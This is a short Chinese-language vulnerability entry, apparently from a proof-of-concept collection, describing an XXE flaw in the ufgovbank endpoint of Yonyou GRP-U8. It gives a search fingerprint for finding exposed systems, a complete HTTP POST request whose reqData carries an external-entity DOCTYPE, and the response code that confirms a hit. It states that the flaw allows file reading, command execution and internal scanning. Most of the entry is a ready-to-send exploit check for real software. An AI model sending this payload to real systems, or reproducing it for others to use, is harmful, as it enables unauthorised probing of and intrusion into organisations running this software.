﻿# 用友GRP-U8 ufgovbank XXE漏洞

> 更新时间：2024-01-15

> 漏洞编号：

> 漏洞说明：用友GRP-U8的ufgovbank接口存在XXE漏洞，攻击者可以在xml中构造恶意命令，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。

> 漏洞特征：app.name="用友GRP-U8 OA"

> 验证脚本：HTTP

```
POST /ufgovbank HTTP/1.1
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

reqData=<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://www.baidu.com">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：用友GRP-U8 ufgovbank XXE漏洞.poc
